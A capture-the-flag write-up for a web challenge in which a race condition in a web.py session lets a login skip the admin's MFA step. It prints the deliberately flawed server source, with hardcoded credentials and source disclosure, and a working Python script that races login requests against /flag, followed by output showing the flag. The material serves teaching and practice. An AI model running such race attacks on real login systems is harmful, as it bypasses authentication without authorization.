# webby

```
@gehaxelt

MFA is awesome! Even if someone gets our login credentials, and they still can't get our secrets!
http://52.59.124.14:5010 
```

Visiting the website gives us some hint in HTML:

```html
<!-- user: user1 / password: user1 -->          
<!-- user: user2 / password: user2 -->          
<!-- user: admin / password: admin -->  
<!-- Find me secret here: /?source -->  
```

However visiting `/?source` does not work. It should be `/?source=1`. Then the server source is printed:

```python
import web
import secrets
import random
import tempfile
import hashlib
import time
import shelve
import bcrypt
from web import form
web.config.debug = False
urls = (
  '/', 'index',
  '/mfa', 'mfa',
  '/flag', 'flag',
  '/logout', 'logout',
)
app = web.application(urls, locals())
render = web.template.render('templates/')
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))
FLAG = open("/tmp/flag.txt").read()

def check_user_creds(user,pw):
    users = {
        # Add more users if needed
        'user1': 'user1',
        'user2': 'user2',
        'user3': 'user3',
        'user4': 'user4',
        'admin': 'admin',

    }
    try:
        return users[user] == pw
    except:
        return False

def check_mfa(user):
    users = {
        'user1': False,
        'user2': False,
        'user3': False,
        'user4': False,
        'admin': True,
    }
    try:
        return users[user]
    except:
        return False


login_Form = form.Form(
    form.Textbox("username", description="Username"),
    form.Password("password", description="Password"),
    form.Button("submit", type="submit", description="Login")
)
mfatoken = form.regexp(r"^[a-f0-9]{32}$", 'must match ^[a-f0-9]{32}$')
mfa_Form = form.Form(
    form.Password("token", mfatoken, description="MFA Token"),
    form.Button("submit", type="submit", description="Submit")
)

class index:
    def GET(self):
        try:
            i = web.input()
            if i.source:
                return open(__file__).read()
        except Exception as e:
            pass
        f = login_Form()
        return render.index(f)

    def POST(self):
        f = login_Form()
        if not f.validates():
            session.kill()
            return render.index(f)
        i = web.input()
        if not check_user_creds(i.username, i.password):
            session.kill()
            raise web.seeother('/')
        else:
            session.loggedIn = True
            session.username = i.username
            session._save()

        if check_mfa(session.get("username", None)):
            session.doMFA = True
            session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
            #session.tokenMFA = "acbd18db4cc2f85cedef654fccc4a4d8"
            session.loggedIn = False
            session._save()
            raise web.seeother("/mfa")
        return render.login(session.get("username",None))

class mfa:
    def GET(self):
        if not session.get("doMFA",False):
            raise web.seeother('/login')
        f = mfa_Form()
        return render.mfa(f)

    def POST(self):
        if not session.get("doMFA", False):
            raise web.seeother('/login')
        f = mfa_Form()
        if not f.validates():
            return render.mfa(f)
        i = web.input()
        if i.token != session.get("tokenMFA",None):
            raise web.seeother("/logout")
        session.loggedIn = True
        session._save()
        raise web.seeother('/flag')


class flag:
    def GET(self):
        if not session.get("loggedIn",False) or not session.get("username",None) == "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)


class logout:
    def GET(self):
        session.kill()
        raise web.seeother('/')

application = app.wsgifunc()
if __name__ == "__main__":
    app.run()
```

There is a race condition: when username and password are correct, the session is updated:

```python
session.loggedIn = True
session.username = i.username
session._save()
```

Which will be overwritten afterwards:

```python
session.doMFA = True
session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
#session.tokenMFA = "acbd18db4cc2f85cedef654fccc4a4d8"
session.loggedIn = False
session._save()
```

If we access `/flag` in between, we can pass the validation:

```python
class flag:
    def GET(self):
        if not session.get("loggedIn",False) or not session.get("username",None) == "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)
```

Attack script:

```python
import requests
import concurrent.futures

r = requests.post(
    "http://52.59.124.14:5010/",
    data={
        "username": "admin",
        "password": "admin",
    },
)
cookie = r.headers["Set-Cookie"].split(";")[0]
print(r.headers, cookie)

executor = concurrent.futures.ThreadPoolExecutor(max_workers=5)

def get_flag(cookie):
    r = requests.get(
        "http://52.59.124.14:5010/flag",
        headers={"Cookie": cookie},
    )
    if "ENO" in r.text:
        print(r.text)
    else:
        print("No flag")

while True:
    r = requests.post(
        "http://52.59.124.14:5010/",
        headers={"Cookie": cookie},
        data={
            "username": "admin",
            "password": "admin",
        },
    )
    cookie = r.headers["Set-Cookie"].split(";")[0]
    print(r.headers, cookie)
    executor.submit(get_flag, cookie)
```

Output:

```
{'Content-Type': 'text/html; charset=utf-8', 'Set-Cookie': 'webpy_session_id=abbf6513a4eea55f52fb4f6325bdeb7c6f09e29d; HttpOnly; Path=/'} webpy_session_id=abbf6513a4eea55f52fb4f6325bdeb7c6f09e29d
{'Content-Type': 'text/html; charset=utf-8', 'Set-Cookie': 'webpy_session_id=4bf6378d312b94defd00fb8b680155af6c3135e0; HttpOnly; Path=/'} webpy_session_id=4bf6378d312b94defd00fb8b680155af6c3135e0
No flag
{'Content-Type': 'text/html; charset=utf-8', 'Set-Cookie': 'webpy_session_id=4bf6378d312b94defd00fb8b680155af6c3135e0; HttpOnly; Path=/'} webpy_session_id=4bf6378d312b94defd00fb8b680155af6c3135e0
No flag
{'Content-Type': 'text/html; charset=utf-8', 'Set-Cookie': 'webpy_session_id=4bf6378d312b94defd00fb8b680155af6c3135e0; HttpOnly; Path=/'} webpy_session_id=4bf6378d312b94defd00fb8b680155af6c3135e0
<html>
        <head>
                <title>Webby: Flag</title>
        </head>
        <body>
                <h1>Webby: Flag</h1>
                <p>ENO{R4Ces_Ar3_3ver1Wher3_Y3ah!!}</p>
                <a href="/logout">Logout</a>
        </body>
</html>
```

Solved.
